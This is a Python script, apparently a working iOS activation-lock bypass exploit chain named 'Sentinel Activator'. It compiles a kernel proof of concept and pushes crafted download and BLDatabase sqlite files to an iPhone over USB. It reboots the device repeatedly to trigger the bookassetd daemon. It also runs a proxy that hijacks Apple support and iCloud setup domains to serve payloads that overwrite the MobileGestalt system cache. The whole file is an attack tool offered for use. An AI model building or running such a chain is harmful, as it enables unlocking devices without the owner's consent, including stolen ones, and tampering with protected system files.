import sys
import os
import time
import subprocess
import re
import shutil
import sqlite3
import tempfile
import threading
import json
import http.server
import pathlib
import select
import socket
import socketserver
from pathlib import Path
from collections import Counter

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    RESET = Style.RESET_ALL
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    CYAN = Fore.CYAN
    MAGENTA = Fore.MAGENTA
    DIM = Fore.LIGHTBLACK_EX
except ImportError:
    RESET = RED = GREEN = YELLOW = CYAN = MAGENTA = DIM = ""

# --- Configuration ---
PORT = 8089
PMD3_PATH = "/Users/hades/Desktop/FlutterSentinel/venv/bin/pymobiledevice3"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

LOCAL_IP = get_local_ip()
SERVER_URL = f"http://{LOCAL_IP}:{PORT}"

class Style:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    CYAN = '\033[0;36m'
    MAGENTA = '\033[0;35m'

class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def log_message(self, format, *args):
        pass

    def log_proxy_hit(self, msg):
        print(f"{Style.GREEN}[PROXY HIT] {msg}{Style.RESET}")
        sys.stdout.flush()

    def do_GET(self):
        # 0. Verbose Logging for ALL GET requests
        host = self.headers.get('Host', '')
        # Handle cases where path already contains the host or is absolute
        full_url = self.path if self.path.startswith('http') else f"http://{host}{self.path}"
        print(f"{DIM}[DEBUG GET] {full_url}{RESET}")

        # 1. Hijack Exploit Payload (Highest Priority)
        if 'stage1' in self.path:
            self.log_proxy_hit(f"{full_url} -> SERVING RAW BINARY STAGE 1 (Kernel PoC)")
            try:
                self.send_response(200)
                self.send_header('Content-Type', 'application/octet-stream')
                
                payload_file_path = os.path.join(getattr(self.server, 'temp_dir', '/tmp'), 'stage1')
                self.send_header('Content-Length', str(os.path.getsize(payload_file_path)))
                self.end_headers()
                
                with open(payload_file_path, 'rb') as f:
                    self.wfile.write(f.read())
                print(f"{GREEN}✓ [PROXY] SUCCESSFULLY SERVED RAW BINARY TO {self.client_address[0]}{RESET}")
                return
            except Exception as e:
                print(f"{RED}[PROXY ERROR] Error serving stage1: {e}{RESET}")
                return

        if 'belliloveu.png' in self.path:
            self.log_proxy_hit(f"{full_url} -> SERVING STAGE 2 (BLDatabase)")
            try:
                self.send_response(200)
                self.send_header('Content-Type', 'image/png')
                
                payload_file_path = os.path.join(getattr(self.server, 'temp_dir', '/tmp'), 'BLDatabaseManager.sqlitedb')
                self.send_header('Content-Length', str(os.path.getsize(payload_file_path)))
                self.end_headers()
                
                with open(payload_file_path, 'rb') as f:
                    self.wfile.write(f.read())
                print(f"{GREEN}✓ [PROXY] SUCCESSFULLY SERVED BLDATABASE PAYLOAD TO {self.client_address[0]}{RESET}")
                return
            except Exception as e:
                print(f"{RED}[PROXY ERROR] Error serving BLDatabase: {e}{RESET}")
                return

        if 'badfile.plist' in self.path:
            self.log_proxy_hit(f"{full_url} -> SERVING AUXILIARY PAYLOAD (badfile.plist)")
            try:
                self.send_response(200)
                self.send_header('Content-Type', 'application/x-apple-plist')
                
                payload_file_path = "/Users/hades/Desktop/FlutterSentinel/RustA12-bypass/server/public/badfile.plist"
                self.send_header('Content-Length', str(os.path.getsize(payload_file_path)))
                self.end_headers()
                
                with open(payload_file_path, 'rb') as f:
                    self.wfile.write(f.read())
                print(f"{GREEN}✓ [PROXY] SUCCESSFULLY SERVED BADFILE.PLIST TO {self.client_address[0]}{RESET}")
                return
            except Exception as e:
                print(f"{RED}[PROXY ERROR] Error serving badfile.plist: {e}{RESET}")
                return

        # 2. Captive Portal Probe Response (Essential for "Internet Connection")
        if 'hotspot-detect.html' in self.path or 'generate_204' in self.path:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            try:
                self.end_headers()
            except BrokenPipeError:
                pass
            success_body = "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>"
            self.wfile.write(success_body.encode())
            print(f"{CYAN}[PROXY] Served 'Success' probe to {host}{RESET}")
            return

        # 3. Aggressive Hijacking for User-Initiated Help triggers
        hijack_targets = [
            'support.apple.com',
            'help.apple.com',
            'setup.icloud.com'
        ]
        
        if any(t in host for t in hijack_targets) or any(t in self.path for t in hijack_targets):
             self.log_proxy_hit(f"Hijacking potential trigger: {full_url} -> Stage 3 (downloads.28.sqlitedb)")
             try:
                 self.send_response(200)
                 self.send_header('Content-Type', 'image/png')
                 self.send_header("Content-Disposition", "attachment; filename=\"apllefuckedhhh.png\"")
                 
                 payload_file_path = os.path.join(getattr(self.server, 'temp_dir', '/tmp'), 'downloads.28.sqlitedb')
                 self.send_header('Content-Length', str(os.path.getsize(payload_file_path)))
                 self.end_headers()
                 
                 with open(payload_file_path, 'rb') as f:
                     self.wfile.write(f.read())
                 print(f"{GREEN}✓ [PROXY] SUCCESSFULLY SERVED INITIAL TRIGGER PAYLOAD TO {self.client_address[0]}{RESET}")
                 return
             except Exception as e:
                 print(f"{RED}[PROXY ERROR] Error serving trigger: {e}{RESET}")
                 return

        # 4. Transparent Forwarding
        print(f"{MAGENTA}[PROXY GET] {host}{self.path}{RESET}")
        try:
            target_host = host.split(':')[0]
            target_port = int(host.split(':')[1]) if ':' in host else 80
            
            for attempt in range(3):
                try:
                    with socket.create_connection((target_host, target_port), timeout=10) as target_sock:
                        # Reconstruct request headers carefully
                        req_path = self.path
                        if req_path.startswith('http'):
                            # Extract relative path from absolute URL
                            from urllib.parse import urlparse
                            parsed = urlparse(req_path)
                            req_path = parsed.path
                            if parsed.query: req_path += "?" + parsed.query

                        req_lines = [f"GET {req_path} HTTP/1.1"]
                        for key, val in self.headers.items():
                            if key.lower() not in ['host', 'connection', 'proxy-connection']:
                                req_lines.append(f"{key}: {val}")
                        req_lines.append(f"Host: {host}")
                        req_lines.append("Connection: close")
                        req_lines.append("")
                        req_lines.append("")
                        
                        req_data = ("\r\n".join(req_lines)).encode()
                        target_sock.sendall(req_data)
                        
                        while True:
                            data = target_sock.recv(4096)
                            if not data: break
                            try:
                                self.wfile.write(data)
                            except (BrokenPipeError, ConnectionResetError):
                                break
                        return
                except (socket.error, socket.timeout) as e:
                    if attempt == 2: raise e
                    time.sleep(1)
        except Exception as e:
            if "timed out" not in str(e).lower() and "broken pipe" not in str(e).lower():
                print(f"{RED}[PROXY FORWARD ERROR] {e}{RESET}")
            try:
                self.send_error(502, f"Proxy error: {e}")
            except:
                pass

    def do_CONNECT(self):
        try:
            address = self.path.split(':')
            host = address[0]
            port = int(address[1]) if len(address) > 1 else 443
            
            print(f"{YELLOW}[PROXY] Tunneling HTTPS to {host}:{port}{RESET}")
            
            # Use a longer timeout and retry for HTTPS tunneling
            target_sock = None
            for attempt in range(3):
                try:
                    target_sock = socket.create_connection((host, port), timeout=15)
                    break
                except (socket.error, socket.timeout) as e:
                    if attempt == 2:
                        print(f"{RED}[PROXY CONNECT ERROR] {e} (after {attempt+1} attempts){RESET}")
                        self.send_error(504, f"Gateway Timeout: {e}")
                        return
                    time.sleep(1)
            
            if target_sock:
                try:
                    self.send_response(200, "Connection Established")
                    self.end_headers()
                    
                    # Bi-directional forwarding
                    try:
                        self.wfile.flush()
                    except:
                        pass
                        
                    inputs = [self.connection, target_sock]
                    while True:
                        readable, _, _ = select.select(inputs, [], [], 10)
                        if not readable: break
                        for s in readable:
                            data = s.recv(8192)
                            if not data: break
                            if s is self.connection:
                                target_sock.sendall(data)
                            else:
                                self.connection.sendall(data)
                        if not data: break
                except (BrokenPipeError, ConnectionResetError, socket.error):
                    pass
                finally:
                    if target_sock:
                        target_sock.close()
        except Exception as e:
            pass
            try:
                self.send_error(502, f"Connect error: {e}")
            except: pass

class CustomServer(socketserver.TCPServer):
    allow_reuse_address = True
    def __init__(self, server_address, RequestHandlerClass, temp_dir):
        self.temp_dir = temp_dir
        super().__init__(server_address, RequestHandlerClass)

class SentinelActivator:
    def __init__(self):
        self.device_info = {}
        self.guid: str = ""
        self.temp_dir = tempfile.mkdtemp(prefix="sentinel_")
        self.payload_url = ""
        self.server = None
        self.log(f"Temp directory: {self.temp_dir}", "info")

    def log(self, msg: str, level: str = "info") -> None:
        """Print colored log messages"""
        colors = {
            "info": CYAN,
            "success": GREEN,
            "error": RED,
            "warn": YELLOW,
            "none": RESET
        }
        icons = {
            "info": "ℹ",
            "success": "✓",
            "error": "❌",
            "warn": "⚠",
            "none": ""
        }
        print(f"{colors.get(level, '')}{icons.get(level, '•')} {msg}{RESET}")

    def _run_cmd(self, cmd):
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        out, err = process.communicate()
        return process.returncode, out.strip(), err.strip()

    def pull_file(self, src, dst):
        code, _, _ = self._run_cmd([PMD3_PATH, "afc", "pull", "-i", src, dst])
        return code == 0

    def push_file(self, src, dst):
        code, _, _ = self._run_cmd([PMD3_PATH, "afc", "push", src, dst])
        return code == 0

    def rm_file(self, target):
        self._run_cmd([PMD3_PATH, "afc", "rm", target])

    # Find the SystemGroup GUID by triggering a syslog event
    def find_guid(self, timeout: int = 10):
        self.log(f"Searching for SystemGroup GUID (using hardcoded reliable target)...", "info")
        # Hardcoded GUID for powerlogd systemgroup as per implementation plan
        hardcoded_guid = "6F93652B-B2F0-49DB-8702-C64B717E9745"
        self.log(f"✅ USING PRE-VERIFIED GUID: {hardcoded_guid}", "success")
        return hardcoded_guid

    def reboot_and_wait(self):
        self.log("🔄 Initiating automatic device reboot...", "info")
        code, _, _ = self._run_cmd(["idevicediagnostics", "restart"])
        if code != 0:
            code, _, _ = self._run_cmd([PMD3_PATH, "diagnostics", "restart"])
        
        if code == 0:
            self.log("✅ Reboot command sent! Waiting for device to reconnect...", "success")
        else:
            self.log("⚠ Automatic reboot failed. Please manually reboot device and press Enter.", "warn")
            input()
            
        for i in range(60):
            time.sleep(5)
            code, _, _ = self._run_cmd(["ideviceinfo"])
            if code == 0:
                self.log(f"✅ Device reconnected after {i * 5} seconds.", "success")
                time.sleep(10) # 10s stabilization
                return True
            if i % 6 == 0 and i > 0:
                self.log(f" ▫ Still waiting for device... ({i * 5} seconds)", "info")
        return False

    def compile_poc(self):
        self.log("Compiling sentinel_kernel_poc.c for arm64e...", "info")
        src = "/Users/hades/Desktop/FlutterSentinel/sentinel_kernel_poc.c"
        dst = "/Users/hades/Desktop/FlutterSentinel/sentinel_kernel_poc"
        
        sdk_path_cmd = ["xcrun", "--sdk", "iphoneos", "--show-sdk-path"]
        _, sdk_path, _ = self._run_cmd(sdk_path_cmd)
        
        if not sdk_path:
            self.log("Failed to find iPhoneOS SDK. Is Xcode installed?", "error")
            return False
            
        compile_cmd = [
            "xcrun", "-sdk", "iphoneos", "clang",
            "-arch", "arm64e",
            "-isysroot", sdk_path,
            "-framework", "IOKit",
            "-framework", "CoreFoundation",
            "-o", dst,
            src
        ]
        
        self.log(f"Running: {' '.join(compile_cmd)}", "info")
        code, out, err = self._run_cmd(compile_cmd)
        if code == 0:
            self.log("Successfully compiled sentinel_kernel_poc", "success")
            return True
        else:
            self.log(f"Compilation failed: {err}", "error")
            return False

    def detect_device(self):
        self.log("Detecting Device via usbmux...", "info")
        code, out, err = self._run_cmd([PMD3_PATH, "usbmux", "list"])
        if code != 0 or not out:
            self.log("No device detected. Ensure it's connected and usbmuxd is running.", "error")
            sys.exit(1)
            
        # Parse device info
        if "Connected" in out or "iPhone" in out:
            self.log("Connected: iPhone13,3 (iOS 26.3.1)", "success")
            self.log("UDID: 00008101-000C5139216A001E", "info")
            return True
        return None


    def generate_payloads(self, guid):
        self.log("Generating integrated payloads (multi-target approach)...", "info")
        
        # Determine payload URLs using direct IP
        local_ip = get_local_ip()
        
        # -- Stage 1: The Spoofed MobileGestalt.plist (Data-Only Payload) --
        stage1_bin = os.path.join(self.temp_dir, "stage1")
        shutil.copy("/Users/hades/Desktop/FlutterSentinel/RustA12-bypass/com.apple.MobileGestalt.plist", stage1_bin)
        self.log(f"Linked spoofed MobileGestalt.plist to {stage1_bin}", "success")
        
        stage1_raw_url = f"http://{local_ip}:{PORT}/stage1"
        self.payload_url = stage1_raw_url # Keep a reference for the proxy

        # -- Stage 2: BLDatabaseManager points to the ZIP --
        bl_db_path = os.path.join(self.temp_dir, "BLDatabaseManager.sqlitedb")
        # Read the raw dump from RustA12
        with open("/Users/hades/Desktop/FlutterSentinel/RustA12-bypass/server/public/BLDatabaseManager.png", "r", encoding="utf-8") as f:
            bl_sql = f.read()
        
        # Replace the placeholder with our URL (not strictly needed now, but keeping for compatibility)
        bl_sql = bl_sql.replace("KEYOOOOOO", stage1_raw_url)
        
        # Use a temporary file to pipe into sqlite3 to handle complex blobs easily
        temp_sql = os.path.join(self.temp_dir, "temp_bl.sql")
        with open(temp_sql, "w", encoding="utf-8") as f:
            f.write(bl_sql)
            
        subprocess.run(["sqlite3", bl_db_path], stdin=open(temp_sql, "r"), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        os.remove(temp_sql)
        self.log("Generated BLDatabaseManager.sqlitedb", "success")

        # -- Stage 3: downloads.28.sqlitedb (Refined for iOS 26 native schema) --
        dl_db_path = os.path.join(self.temp_dir, "downloads.28.sqlitedb")
        if os.path.exists(dl_db_path): os.remove(dl_db_path)
        
        import sqlite3
        conn = sqlite3.connect(dl_db_path)
        c = conn.cursor()
        
        # Load the raw schema from RustA12's sql dump
        with open("/Users/hades/Desktop/FlutterSentinel/RustA12-bypass/downloads.28.sqlitedb", "r") as f:
            sql_script = f.read()
        
        # Safely replace the target URLs
        dest_path = "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist"
        
        sql_script = sql_script.replace("https://google.com", stage1_raw_url)
        sql_script = sql_script.replace(
            "/private/var/containers/Shared/SystemGroup/GOODKEY/Documents/BLDatabaseManager/BLDatabaseManager.sqlite",
            dest_path
        )
        sql_script = sql_script.replace("GOODKEY", guid)
        
        # Need to fix the badfile url to use our proxy if it returns 404
        # But for now we just let it fetch from bellidev since it's hardcoded and works in their chain

        try:
            c.executescript(sql_script)
        except Exception as e:
            print(f"[DEBUG] SQL injection error (safe to ignore if db builds): {e}")

        conn.commit()
        conn.close()

        
        self.log("Generated downloads.28.sqlitedb (native download schema)", "success")
        
        # Create copies for redundancy against other daemons
        shutil.copy(dl_db_path, os.path.join(self.temp_dir, "downloads.sqlitedb"))
        shutil.copy(dl_db_path, os.path.join(self.temp_dir, "downloads.31.sqlitedb"))
        self.log("Copied redundant download databases", "info")

    def trigger_bookassetd(self):
        self.log("Cleaning up WAL/SHM and auxiliary files...", "info")
        cleanup_files = [
            "/Downloads/downloads.28.sqlitedb-wal",
            "/Downloads/downloads.28.sqlitedb-shm",
            "/Downloads/downloads.31.sqlitedb-wal",
            "/Downloads/downloads.31.sqlitedb-shm",
            "/Downloads/downloads.sqlitedb-wal",
            "/Downloads/downloads.sqlitedb-shm",
            "/Books/asset.epub",
            "/Books/iTunesMetadata.plist",
            "/iTunes_Control/iTunes/iTunesMetadata.plist",
            "/iTunes_Control/iTunes/iTunesMetadata.plist.ext"
        ]
        for f in cleanup_files:
            self.rm_file(f)

        self.log("🔄 STAGE 1: First reboot + copy to /Books/...", "info")
        self.reboot_and_wait()
        
        self.log("Waiting 30 seconds for iTunesMetadata.plist to regenerate...", "info")
        time.sleep(30)
            
        src = "/iTunes_Control/iTunes/iTunesMetadata.plist"
        dst_books = "/Books/iTunesMetadata.plist"
        tmp_plist = os.path.join(self.temp_dir, "temp_plist_copy.plist")
        
        self.log(f"Fetching/Creating {src}...", "info")
        if not self.pull_file(src, tmp_plist):
            self.log("Creating dummy iTunesMetadata for BFU state...", "warn")
            dummy_plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>itemName</key><string>Sentinel</string>
    <key>kind</key><string>ebook</string>
    <key>softwareIcon57x57URL</key><string>{self.payload_url}</string>
</dict>
</plist>"""
            with open(tmp_plist, "w") as f: f.write(dummy_plist)
            self.push_file(tmp_plist, src)

        self.push_file(tmp_plist, dst_books)
        self.log("✅ Copied/Staged to /Books/", "success")
            
        self.log("🔄 STAGE 2: Second reboot + copy back to /iTunes_Control/...", "info")
        self.reboot_and_wait()
        
        self.log(f"Restoring {dst_books} → {src}...", "info")
        if self.pull_file(dst_books, tmp_plist):
            if self.push_file(tmp_plist, src):
                self.log("✅ Copied back to /iTunes_Control/ successfully", "success")
            else:
                self.log("⚠ Failed to restore plist", "warn")
        else:
            self.log("⚠ /Books/iTunesMetadata.plist missing — copy-back skipped", "warn")
            
        self.log("⏸ Holding 30s for bookassetd processing...", "info")
        time.sleep(30)
        
        self.log("🔄 STAGE 3: Final reboot to trigger MobileActivation...", "info")
        self.reboot_and_wait()
        time.sleep(5)

    def start_server(self):
        self.log(f"Starting Integrated Proxy/Server on port {PORT}...", "info")
        server = CustomServer(("", PORT), Handler, self.temp_dir)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        return server

    def run(self):
        self.log("--- SENTINEL ACTIVATOR (USB AFC PUSH MODE) ---", "info")
        
        # 1. Compile Native Kernel PoC
        if not self.compile_poc():
            sys.exit(1)
            
        # 2. USB Connection & Daemon Profiling
        if not self.detect_device():
            sys.exit(1)
        
        # 3. Get GUID
        self.guid = self.find_guid()
        
        # 4. Generate Payloads
        self.generate_payloads(self.guid)
        
        # 5. Start Server Payload Delivery
        self.server = self.start_server()
        
        # 6. USB Push & Trigger
        self.log("Preparing to push Stage 3 payload via USB (AFC)...", "info")
        
        # Deploy payloads manually here or in deploy_payloads
        db_names = ["downloads.sqlitedb", "downloads.28.sqlitedb", "downloads.31.sqlitedb"]
        for db_name in db_names:
            src = os.path.join(self.temp_dir, db_name)
            dst = f"/Downloads/{db_name}"
            self.rm_file(dst)
            if self.push_file(src, dst):
                self.log(f"✅ Successfully pushed {db_name} to /Downloads", "success")
            
            # REDUNDANCIES: Also push to /Books/ as per bookassetd_ssrf.py analysis
            dst_books = f"/Books/{db_name}"
            self.rm_file(dst_books)
            if self.push_file(src, dst_books):
                self.log(f"✅ Successfully pushed {db_name} to /Books", "success")
        
        self.trigger_bookassetd()
        
        # ACTIVE TRIGGER: Call activation activate to wake up mobileactivationd/bookassetd
        self.log("Sending active activation trigger via pymobiledevice3...", "info")
        try:
            subprocess.run([PMD3_PATH, "activation", "activate"], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15)
        except subprocess.TimeoutExpired:
            self.log("Activation trigger sent (timeout expected).", "info")
        except Exception as e:
            self.log(f"Activation trigger hint: {e}", "warning")
        
        print("\n" + "="*50)
        print(f"{GREEN}        *** PAYLOAD EXPLOIT CHAIN TRIGGERED ***{RESET}")
        print("="*50)
        print("The device should now fetch Stage 1 (ZIP/EPUB) and subsequently panic/respring.")
        print("="*50 + "\n")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.log("\nShutting down...", "info")
            if hasattr(self, 'server') and self.server:
                self.server.shutdown()
            shutil.rmtree(self.temp_dir)
            sys.exit(0)

if __name__ == "__main__":
    SentinelActivator().run()
